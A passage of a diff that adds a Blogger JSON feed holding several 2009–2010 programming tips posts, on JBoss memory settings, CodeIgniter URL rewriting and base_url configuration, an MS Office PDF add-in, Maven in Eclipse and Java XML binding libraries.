JBoss server instance, you may face some issues with unsuccessful deployment and with some error around Out of Memory.<br />So we need to increase memory allocation for Jboss, let's try to add/change JAVA_OPTS for memory allocation in file %JBOSS_HOME%/bin/run.bat as<br /></code><blockquote>set JAVA_OPTS=%JAVA_OPTS% -Xms512m -Xmx1024m  -XX:MaxPermSize=128m</blockquote><br />My applications are now deployed."
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/1726627372255820343/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/01/jboss-422ga-deploying-issue-on-class.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/1726627372255820343"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/1726627372255820343"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/01/jboss-422ga-deploying-issue-on-class.html",
+            "title": "JBoss 4.2.2.GA - Deploying issue on class loading and out of memory"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-695034070438943543"
+        },
+        "published": {
+          "$t": "2010-01-21T21:22:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2010-01-26T08:24:02.639-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "CodeIgniter"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "PHP"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "CodeIgniter - Remove index.php from URI"
+        },
+        "content": {
+          "type": "html",
+          "$t": "Normally with CodeIgniter, the URI will come with http://domain/index.php/controller/method<br />You may have doubt to remove the index.php to have only http://domain/controller/method ..<br /><br />Here is the way:<br />1. mod_rewrite still need to be enable in your apache server<br />2. Open config.php from your application/config and replace <b>$config['index_page'] = “index.php”</b> by <b>$config['index_page'] = “”<br /><br /></b>3. In file .htaccess at the root of your website (should be in website root, where the system directory is) and add following line:<br /><br /><pre><code><br />    RewriteEngine on<br />    RewriteCond $1 !^(index\\.php|resources|robots\\.txt)<br />    RewriteCond %{REQUEST_FILENAME} !-f<br />    RewriteCond %{REQUEST_FILENAME} !-d<br />    RewriteRule ^(.*)$ index.php/$1 [L,QSA]            <br /></code></pre><br />(My case, above changes work fine)<br /><br />4. In some case, the default setting for <b>uri_protocol</b> does not work properly. To solve this problem just replace <b>$config['uri_protocol'] = “AUTO”</b> by <b>$config['uri_protocol'] = “REQUEST_URI”</b> from <b>application/config/config.php</b><br /><br />Enjoy,<br /><br />Update 26/01: If you want both using index.php with URI or no, you just need to skip option 4 (using uri_protocol as AUTO)<br /><b><br /></b>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/695034070438943543/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/01/codeigniter-remove-indexphp-from-uri.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/695034070438943543"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/695034070438943543"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/01/codeigniter-remove-indexphp-from-uri.html",
+            "title": "CodeIgniter - Remove index.php from URI"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-3303492042297684919"
+        },
+        "published": {
+          "$t": "2010-01-21T20:29:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2010-01-21T20:41:12.077-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "CodeIgniter"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "PHP"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "CodeIgniter - Automatic config base url"
+        },
+        "content": {
+          "type": "html",
+          "$t": "In CodeIgniter, you may know that you need to configure base url via config.php (param: $config[\"base_url\"]) so when change domain you may doubt sometimes with such small error; Here a solution to help solving the issue;<br /><br />Change at config.php by fix url with this smart url configuration:<br /><br /><div class=\"codeblock\"><code><span style=\"color: rgb(0, 0, 0);\"> <span style=\"color: rgb(0, 0, 187);\"></span><blockquote><span style=\"color: rgb(0, 0, 187);\">$config[</span><span style=\"color: rgb(221, 0, 0);\">'base_url'</span><span style=\"color: rgb(0, 0, 187);\">] </span><span style=\"color: rgb(0, 119, 0);\">= ((isset(</span><span style=\"color: rgb(0, 0, 187);\">$_SERVER[</span><span style=\"color: rgb(221, 0, 0);\">'HTTPS'</span><span style=\"color: rgb(0, 0, 187);\">]</span><span style=\"color: rgb(0, 119, 0);\">) &amp;&amp; </span><span style=\"color: rgb(0, 0, 187);\">$_SERVER[</span><span style=\"color: rgb(221, 0, 0);\">'HTTPS'</span><span style=\"color: rgb(0, 0, 187);\">] </span><span style=\"color: rgb(0, 119, 0);\">== </span><span style=\"color: rgb(221, 0, 0);\">\"on\"</span><span style=\"color: rgb(0, 119, 0);\">) ? </span><span style=\"color: rgb(221, 0, 0);\">\"https\" </span><span style=\"color: rgb(0, 119, 0);\">: </span><span style=\"color: rgb(221, 0, 0);\">\"http\"</span><span style=\"color: rgb(0, 119, 0);\">);<br /></span><span style=\"color: rgb(0, 0, 187);\">$config[</span><span style=\"color: rgb(221, 0, 0);\">'base_url'</span><span style=\"color: rgb(0, 0, 187);\">] </span><span style=\"color: rgb(0, 119, 0);\">.= </span><span style=\"color: rgb(221, 0, 0);\">\"://\"</span><span style=\"color: rgb(0, 119, 0);\">.</span><span style=\"color: rgb(0, 0, 187);\">$_SERVER[</span><span style=\"color: rgb(221, 0, 0);\">'HTTP_HOST'</span><span style=\"color: rgb(0, 0, 187);\">]</span><span style=\"color: rgb(0, 119, 0);\">;<br /></span><span style=\"color: rgb(0, 0, 187);\">$config[</span><span style=\"color: rgb(221, 0, 0);\">'base_url'</span><span style=\"color: rgb(0, 0, 187);\">] </span><span style=\"color: rgb(0, 119, 0);\">.= </span><span style=\"color: rgb(0, 0, 187);\">str_replace</span><span style=\"color: rgb(0, 119, 0);\">(</span><span style=\"color: rgb(0, 0, 187);\">basename</span><span style=\"color: rgb(0, 119, 0);\">(</span><span style=\"color: rgb(0, 0, 187);\">$_SERVER[</span><span style=\"color: rgb(221, 0, 0);\">'SCRIPT_NAME'</span><span style=\"color: rgb(0, 0, 187);\">]</span><span style=\"color: rgb(0, 119, 0);\">),</span><span style=\"color: rgb(221, 0, 0);\">\"\"</span><span style=\"color: rgb(0, 119, 0);\">,</span><span style=\"color: rgb(0, 0, 187);\">$_SERVER[</span><span style=\"color: rgb(221, 0, 0);\">'SCRIPT_NAME'</span><span style=\"color: rgb(0, 0, 187);\">]</span><span style=\"color: rgb(0, 119, 0);\">); </span></blockquote><span style=\"color: rgb(0, 119, 0);\"></span> </span> </code></div><br />Source: <a href=\"http://codeigniter.com/wiki/Automatic_configbase_url/\">http://codeigniter.com/wiki/Automatic_configbase_url/</a>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/3303492042297684919/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/01/codeigniter-automatic-config-base-url.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/3303492042297684919"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/3303492042297684919"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/01/codeigniter-automatic-config-base-url.html",
+            "title": "CodeIgniter - Automatic config base url"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-6351274076436522199"
+        },
+        "published": {
+          "$t": "2009-11-05T20:12:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2009-11-05T20:19:54.607-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Microsoft"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "MS Office"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "MS Office 2007"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "PDF"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Tips"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "XPS"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "2007 Microsoft Office Add-in: Microsoft Save as PDF or XPS"
+        },
+        "content": {
+          "type": "html",
+          "$t": "I start using MS Office 2007 and also has Adobe Acrobat 8.0 install, I can print as PDF in MS Word 2003 but not with MS Office 2007. See below screen shots of error:<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2TlCFNAz4CvYn-fBGzvDmbSaOQfcIgwTcZI-9twiEoLTIM1faDUFy9aRExYPsf_5sS1M4vpnCfF-xt-lWLQ92NPSCCFxVri13rijqu9dxXacyEmNgW4G1BltTcfBi3IggrWvAgtjh-KRH/s1600-h/print_to_pdf.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 328px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2TlCFNAz4CvYn-fBGzvDmbSaOQfcIgwTcZI-9twiEoLTIM1faDUFy9aRExYPsf_5sS1M4vpnCfF-xt-lWLQ92NPSCCFxVri13rijqu9dxXacyEmNgW4G1BltTcfBi3IggrWvAgtjh-KRH/s400/print_to_pdf.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5400839368024803794\" border=\"0\" /></a><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrHE8rP_pNQWzkSW2RICEVHa4vP7JG6ZGvpImU2sF5D5GmSKkiWb99_CfvYPUx3P3dbkqok-B_4bhWG2wuBNCItxaW_eGoYk6toR-FNe5ZGsRMqQipn8lAkUs5d2vJmRH__IasBzIbBmig/s1600-h/print_to_pdf_error_activation.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 179px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrHE8rP_pNQWzkSW2RICEVHa4vP7JG6ZGvpImU2sF5D5GmSKkiWb99_CfvYPUx3P3dbkqok-B_4bhWG2wuBNCItxaW_eGoYk6toR-FNe5ZGsRMqQipn8lAkUs5d2vJmRH__IasBzIbBmig/s400/print_to_pdf_error_activation.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5400839444206485250\" border=\"0\" /></a><br />But in fact with MS Office 2007, Microsoft has provided an add-in for converting from DOC to PDF very easily, just download from: <a href=\"http://www.microsoft.com/downloads/details.aspx?FamilyId=4D951911-3E7E-4AE6-B059-A2E79ED87041&amp;displaylang=en\">http://www.microsoft.com/downloads/details.aspx?FamilyId=4D951911-3E7E-4AE6-B059-A2E79ED87041&amp;displaylang=en</a><br /><br />After I install: <span style=\"font-weight: bold;\">SaveAsPDFandXPS.exe</span><br />I can convert by go to: <span style=\"font-weight: bold;\">Save As -> PDF or XPS</span><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4aSxqmB7gQRLcswoGneMcL_-i831CRfctUrjh5c1pQSFn87vZaG9pFmaYn8sEcCqJRbgn9Q0OQDiKEyNePVFFDd5TUOX-NCaJilXUnDa6q1JwKkAYDNKF1480iIka-eY3kU6tOv4diYF1/s1600-h/save_as_pdf.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 398px; height: 400px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4aSxqmB7gQRLcswoGneMcL_-i831CRfctUrjh5c1pQSFn87vZaG9pFmaYn8sEcCqJRbgn9Q0OQDiKEyNePVFFDd5TUOX-NCaJilXUnDa6q1JwKkAYDNKF1480iIka-eY3kU6tOv4diYF1/s400/save_as_pdf.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5400840418668060450\" border=\"0\" /></a>PDF loaded as expected!<br />Great!"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/6351274076436522199/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/11/2007-microsoft-office-add-in-microsoft.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/6351274076436522199"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/6351274076436522199"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/11/2007-microsoft-office-add-in-microsoft.html",
+            "title": "2007 Microsoft Office Add-in: Microsoft Save as PDF or XPS"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2TlCFNAz4CvYn-fBGzvDmbSaOQfcIgwTcZI-9twiEoLTIM1faDUFy9aRExYPsf_5sS1M4vpnCfF-xt-lWLQ92NPSCCFxVri13rijqu9dxXacyEmNgW4G1BltTcfBi3IggrWvAgtjh-KRH/s72-c/print_to_pdf.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-7371310941497407249"
+        },
+        "published": {
+          "$t": "2009-10-04T19:26:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-10-04T23:54:00.514-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "barcamppp"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Django"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "J2EE"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Java"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "PHP"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Presentation"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Python"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Ruby"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Ruby on Rails"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "At BarCamp 2009, topic: The State of The Art of Web Development"
+        },
+        "content": {
+          "type": "html",
+          "$t": "Hi,<br />Here is my presentation at barcamp phnom penh 2009, on Sunday 4th of October at Pannasastra University (Norodom), in hall room, Room Phnom Tamao at 11:30am to 12:30pm.<br /><br />It was about the state of the art of web development, wanna to express how web technologies going on since it was started and today; also a bit view on how the future is.<br /><br />The presentation, it's just starting or a beginning of the topic. Among those points, parts related to technologies of Java/J2EE, Django/Ruby on Rails, PHP style coding need to improve in the presentation, hope to do it more in next part.<br /><br />Enjoy here:<br /><br /><iframe src=\"http://docs.google.com/present/embed?id=dc6xdjk9_13tpxs2hq&amp;size=m\" width=\"555\" frameborder=\"0\" height=\"451\"></iframe>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/7371310941497407249/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/10/at-barcamp-2009-topic-state-of-art-of.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/7371310941497407249"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/7371310941497407249"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/10/at-barcamp-2009-topic-state-of-art-of.html",
+            "title": "At BarCamp 2009, topic: The State of The Art of Web Development"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-5757307801041226053"
+        },
+        "published": {
+          "$t": "2009-10-01T04:51:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-10-01T05:16:54.231-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Eclipse"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Java"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Maven"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Maven 2"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "POM"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Run maven commands in Eclipse as External Tool"
+        },
+        "content": {
+          "type": "html",
+          "$t": "You might already know what is <a href=\"http://maven.apache.org/index.html\">maven</a>; it's a tool to build / compile or package java project...<br /><blockquote>Apache Maven is a software project management and comprehension tool. Based on the concept of a project object model         (POM), Maven can manage a project's build, reporting and documentation from a central piece of information.<br />  </blockquote>Here, I want to show how to configure maven to use as external tool in eclipse IDE so easy for you to execute maven commands from the Eclipse interface easy without needing to open a DOS prompt to use. Here is the procedure:<br /><br />1. Suppose maven 2 already install some where on your PC, (mine is in D:\\Work\\install\\Tools\\maven-2.0.4)<br />2. From the menu bar, select <span style=\"font-weight: bold;\">Window</span> > <span style=\"font-weight: bold;\">Preferences</span>. Select the <span style=\"font-weight: bold;\">Run/Debug</span> > <span style=\"font-weight: bold;\">String Substitution</span>. Add a new variable e.g. <i style=\"font-weight: bold;\">maven_exec</i>.<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUwesZl037FC-MhYV8IIhzGMO9-WvgNZKBfdHxDAGQ0ZNBtLEWeeD4LCiIC6-CTVGU9O_8c-r15uhqFDQ9vt541szL6Pv5nMLCyWTiCwdnYzNtYn9yrUhncwcTaJ9fl6C7rr_1Wq-bj-F3/s1600-h/maven_eclipse_maven_exec.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 313px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUwesZl037FC-MhYV8IIhzGMO9-WvgNZKBfdHxDAGQ0ZNBtLEWeeD4LCiIC6-CTVGU9O_8c-r15uhqFDQ9vt541szL6Pv5nMLCyWTiCwdnYzNtYn9yrUhncwcTaJ9fl6C7rr_1Wq-bj-F3/s400/maven_eclipse_maven_exec.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5387601740815583154\" border=\"0\" /></a>3. Set up a new external launcher from the menu bar, select <span style=\"font-weight: bold;\">Run > External Tools. Select Program<br /></span><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhg0t0_TIpM_wAkPM7OliYadkzX7L9GbiFCKbr4lyDQo46oymnZxx_CbI77JIrGR2fFGi6htwp33KbXOyFzW1P91uM7eIZqsCv4f1AseYPFzMTcSiatT26FDyAXMdet4HyMJUBDRCue5Pi0/s1600-h/maven_eclipse_create_program.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 197px; height: 178px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhg0t0_TIpM_wAkPM7OliYadkzX7L9GbiFCKbr4lyDQo46oymnZxx_CbI77JIrGR2fFGi6htwp33KbXOyFzW1P91uM7eIZqsCv4f1AseYPFzMTcSiatT26FDyAXMdet4HyMJUBDRCue5Pi0/s400/maven_eclipse_create_program.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5387601911546103794\" border=\"0\" /></a>4. Create each maven task, example: in here, I create only the build classpath<br /><ul><li>On program, create a new program and name as: build_classpath (any name as you wish)</li><li>In location box: choose our created variable:<span style=\"font-style: italic; font-weight: bold;\"> maven_exec</span></li><li>In Working Directory<span style=\"font-style: italic; font-weight: bold;\">: </span><span style=\"font-weight: bold;\"></span>choose variable:<span style=\"font-style: italic; font-weight: bold;\"> project_loc</span></li><li>In Argument, give maven command, in here is:<span style=\"font-style: italic; font-weight: bold;\"><span style=\"font-style: italic;\"><span style=\"font-weight: bold;\"> </span></span>eclipse:clean eclipse:eclipse</span></li><li>Click on Apply and Run if you wish now<span style=\"font-style: italic; font-weight: bold;\"><br /></span></li></ul><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO-bQYDQiZhGLttWf1ztGCeqhyphenhyphenfO3HGyo8l4OftPOmkDJYo7TGytZiZYsIp9gSYOzLz-A3IXT5wx3eid7HvrsVJXfvXpiJ8ISMufnSW71yXtOk6wjzL-4pqV9D1FveJSbCVdgya6gQB4cj/s1600-h/maven_eclipse_create_task_build.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 320px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO-bQYDQiZhGLttWf1ztGCeqhyphenhyphenfO3HGyo8l4OftPOmkDJYo7TGytZiZYsIp9gSYOzLz-A3IXT5wx3eid7HvrsVJXfvXpiJ8ISMufnSW71yXtOk6wjzL-4pqV9D1FveJSbCVdgya6gQB4cj/s400/maven_eclipse_create_task_build.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5387602021386755554\" border=\"0\" /></a>5. So you can execute the external tool program by execute Run button, result should be in console tab:<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCyziJW_MrOENtEX-EByYohXe_l-1128WBICcfDgB5GBa5JzVqLtEFbdL_rukYv3k-do8Ntej5IQ13liOO1h87H3-VWkhl3lngvjeNQgZIqYYZvkobPNXBeblYgETAA3lrUdd6ENtKrsEp/s1600-h/maven_eclipse_build_successful.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 193px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCyziJW_MrOENtEX-EByYohXe_l-1128WBICcfDgB5GBa5JzVqLtEFbdL_rukYv3k-do8Ntej5IQ13liOO1h87H3-VWkhl3lngvjeNQgZIqYYZvkobPNXBeblYgETAA3lrUdd6ENtKrsEp/s400/maven_eclipse_build_successful.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5387602125051224386\" border=\"0\" /></a><br />Enjoy,<br /><span style=\"font-weight: bold;\"><br /></span>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/5757307801041226053/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/10/run-maven-commands-in-eclipse-as.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5757307801041226053"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5757307801041226053"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/10/run-maven-commands-in-eclipse-as.html",
+            "title": "Run maven commands in Eclipse as External Tool"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUwesZl037FC-MhYV8IIhzGMO9-WvgNZKBfdHxDAGQ0ZNBtLEWeeD4LCiIC6-CTVGU9O_8c-r15uhqFDQ9vt541szL6Pv5nMLCyWTiCwdnYzNtYn9yrUhncwcTaJ9fl6C7rr_1Wq-bj-F3/s72-c/maven_eclipse_maven_exec.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-1338035374487678070"
+        },
+        "published": {
+          "$t": "2009-09-25T06:19:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-09-25T06:27:49.698-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Digester"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Java"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Jibx"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "XML"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Jibx XML loading & Digester, which one is more flexible?"
+        },
+        "content": {
+          "type": "html",
+          "$t": "<a href=\"http://jibx.sourceforge.net/\">Jibx </a>is one of the popular XML parsing in Java and also <a href=\"http://commons.apache.org/digester/\">Digester</a>.<br /><br />Jibx bases on binding.xml file to map XML nodes to Java Objects<br />Digester also base on digester-rule xml file to map to Java Objects<br /><br />What I found here, in Jibx we need to map all fields of the XML to the binding but in digester, we can filter for which fields we want...<br /><br />To prove, will see in next post for more analyze.."
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/1338035374487678070/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/09/jibx-xml-loading-digester-which-one-is.html#comment-form",
+            "title": "1 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/1338035374487678070"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
